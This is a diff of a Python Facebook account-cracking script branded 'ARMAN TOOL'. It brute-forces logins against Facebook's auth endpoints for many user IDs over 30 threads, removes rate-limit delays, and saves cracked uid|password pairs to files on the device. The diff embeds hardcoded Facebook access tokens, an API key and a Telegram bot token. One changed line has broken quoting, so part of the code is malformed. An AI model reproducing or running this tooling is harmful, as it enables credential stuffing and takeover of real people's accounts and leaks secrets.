@@ -33,8 +33,12 @@ requests.urllib3.disable_warnings()
 
 FIREBASE_URL = "https://arman-f9a3b-default-rtdb.firebaseio.com/"
 
+# --- LIVE GRAPH ENGINE (v26.0) ---
+GRAPH_VERSION = "v26.0"
+FB_TOKEN = "EAATlPU5kUrABSIcmqVSaWZAsFYbQc9mbzfLGBNlIAiZA4teNZAdZBM3JwjL13hdlCRGzEdXczzaCNuqIZCV0Sjve2zeTXlQuGlB7dZAnTuXgqSQTj4kw0RPNg1HnU1xFaUGZBGzoQiQVZAyIkRZBBleZCZAi8kSZCRPtK41wUSafb3r1XYqBj2HmqOXyCI2Va5Puf4Fx36z3VgOSp1uABclGcWfHDSjfT4l2QuAk"
+
 BOT_TOKEN = "8533770908:AAGpn4bIfoArEOyN7SjTskWnzIyGGjEPOoc"
-TELEGRAM_USER = "7111707713"
+TELEGRAM_USER = "8568795915"
 
 def check_update():
     try:
@@ -42,7 +46,7 @@ def check_update():
         response = requests.get(url, timeout=5)
         server_version = response.json()
         
-        current_version = "v26.0"
+        current_version = "v13.4"
         
         if server_version and str(server_version).strip() != str(current_version).strip():
             print("\n\x1b[38;5;196m========================================\033[0m")
@@ -165,8 +169,8 @@ def display_welcome_banner(user_name, user_key, time_left):
     print(f"""
 \033[1;36m╔════════════════════════════════════════════╗
 ║             🔥 ARMAN TOOL 🔥               ║
-╠════════════════════════════════════════════╝
-║ 🇵🇰 ᴘᴛɪ       : ᴘᴛɪ ᴛɪɢᴇʀ                   ║
+╠════════════════════════════════════════════╣
+║ 🇵🇰 ᴘᴛɪ  KI     : ᴘᴛɪ ᴛɪɢᴇʀ                   ║
 ║ 👑 ᴋʜᴀɴ ᴅɪᴡᴀɴᴀ: ᴅɪʟ ᴍᴀɪɴ ɪᴍʀᴀɴ ᴋʜᴀɴ         ║
 ║ ⏳ ᴠᴀʟɪᴅɪᴛʏ  : {time_left:<27} ║
 ║ ⚡ sʏsᴛᴇᴍ ᴋᴀ ʙᴀᴘ: ɪᴍʀᴀɴ ᴋʜᴀɴ               ║
@@ -404,7 +408,7 @@ def show_branding():
     print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mFACEBOOK   \x1b[38;5;46m▶  \033[1;97mARMAN-TOOL")
     print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mWHATSAPP   \x1b[38;5;46m▶  \033[1;97m03022745249")
     print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mFEATURE    \x1b[38;5;46m▶  \033[1;97mOLD CLONING")
-    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mVERSION    \x1b[38;5;46m▶  \033[1;97mv26.0")
+    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mVERSION    \x1b[38;5;46m▶  \033[1;97m15.3")
     print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
 
 def ____banner____():
@@ -496,7 +500,7 @@ def old_One():
     print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
     linex()
     meth = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE (A/B): ").strip().upper()
-    with tred(max_workers=20) as pool:
+    with tred(max_workers=30) as pool:
         ____banner____()
         print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK " + Y + ": " + G + " " + limit + W)
         print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT" + G)
@@ -531,7 +535,7 @@ def old_Tow():
     print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD B')
     linex()
     meth = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE (A/B): ").strip().upper()
-    with tred(max_workers=20) as pool:
+    with tred(max_workers=30) as pool:
         ____banner____()
         print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK " + Y + ": " + G + " " + limit + W)
         print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT" + G)
@@ -564,7 +568,7 @@ def old_Tree():
     print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMethod B')
     linex()
     meth = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE (A/B): ").strip().upper()
-    with tred(max_workers=20) as pool:
+    with tred(max_workers=30) as pool:
         ____banner____()
         print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK " + Y + ":" + G + limit + W)
         print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT" + G)
@@ -596,7 +600,7 @@ def login_1(uid):
                 'source': 'device_based_login',
                 'email': str(uid),
                 'password': str(pw),
-                'access_token': 'EAATlPU5kUrABSIcmqVSaWZAsFYbQc9mbzfLGBNlIAiZA4teNZAdZBM3JwjL13hdlCRGzEdXczzaCNuqIZCV0Sjve2zeTXlQuGlB7dZAnTuXgqSQTj4kw0RPNg1HnU1xFaUGZBGzoQiQVZAyIkRZBBleZCZAi8kSZCRPtK41wUSafb3r1XYqBj2HmqOXyCI2Va5Puf4Fx36z3VgOSp1uABclGcWfHDSjfT4l2QuAk',
+                'access_token': ''EAATlPU5kUrABSIcmqVSaWZAsFYbQc9mbzfLGBNlIAiZA4teNZAdZBM3JwjL13hdlCRGzEdXczzaCNuqIZCV0Sjve2zeTXlQuGlB7dZAnTuXgqSQTj4kw0RPNg1HnU1xFaUGZBGzoQiQVZAyIkRZBBleZCZAi8kSZCRPtK41wUSafb3r1XYqBj2HmqOXyCI2Va5Puf4Fx36z3VgOSp1uABclGcWfHDSjfT4l2QuAk"',
                 'generate_session_cookies': '1',
                 'meta_inf_fbmeta': '',
                 'advertiser_id': str(uuid.uuid4()),
@@ -609,28 +613,20 @@ def login_1(uid):
                 'api_key': '882a8490361da98702bf97a021ddc14d'
             }
             headers = get_smart_headers()
-            response = session.post('https://b-graph.facebook.com/v26.0/auth/login', data=data, headers=headers, allow_redirects=False, timeout=10)
-            
-            try:
-                res = response.json()
-            except Exception:
-                continue
-
-            if 'session_key' in res or 'access_token' in res:
+            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
+            if 'session_key' in res:
                 print(f"\r\r\x1b[1;37m>(\x1b[1;37mARMAN\x1b[38;5;196m) = \x1b[38;5;46m{uid} = \x1b[38;5;46m{pw} = \x1b[38;5;45m{creationyear(uid)}")
                 open('/sdcard/ARMAN-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
-            elif 'www.facebook.com' in str(res):
+            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                 print(f"\r\r(\x1b[1;37mARMAN\x1b[38;5;196m) = \x1b[38;5;46m{uid} = \x1b[38;5;46m{pw} = \x1b[38;5;45m{creationyear(uid)}")
                 open('/sdcard/ARMAN-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
         loop += 1
-        time.sleep(1)
     except Exception:
-        loop += 1
-        time.sleep(2)
+        time.sleep(5)
 
 def login_2(uid):
     global loop
@@ -640,14 +636,14 @@ def login_2(uid):
         try:
             with requests.Session() as session:
                 headers = get_smart_headers()
-                url = f"https://b-graph.facebook.com/v26.0/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&access_token=EAATlPU5kUrABSIcmqVSaWZAsFYbQc9mbzfLGBNlIAiZA4teNZAdZBM3JwjL13hdlCRGzEdXczzaCNuqIZCV0Sjve2zeTXlQuGlB7dZAnTuXgqSQTj4kw0RPNg1HnU1xFaUGZBGzoQiQVZAyIkRZBBleZCZAi8kSZCRPtK41wUSafb3r1XYqBj2HmqOXyCI2Va5Puf4Fx36z3VgOSp1uABclGcWfHDSjfT4l2QuAk"
-                response = session.get(url, headers=headers, timeout=10)
-                try:
-                    po = response.json()
-                except Exception:
-                    continue
-
-                if 'session_key' in str(po) or 'access_token' in str(po):
+                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
+                po = session.get(url, headers=headers).json()
+                if 'session_key' in str(po):
+                    print(f"\r\r(\x1b[1;37mARMAN\x1b[38;5;196m) = \x1b[38;5;46m{uid} = \x1b[38;5;46m{pw} = \x1b[38;5;45m{creationyear(uid)}")
+                    open('/sdcard/ARMAN-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    oks.append(uid)
+                    break
+                elif 'session_key' in po:
                     print(f"\r\r(\x1b[1;37mARMAN\x1b[38;5;196m) = \x1b[38;5;46m{uid} = \x1b[38;5;46m{pw} = \x1b[38;5;45m{creationyear(uid)}")
                     open('/sdcard/ARMAN-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                     oks.append(uid)
@@ -655,7 +651,6 @@ def login_2(uid):
         except Exception:
             pass
     loop += 1
-    time.sleep(1)
 
 if __name__ == '__main__':
     result = check_key()
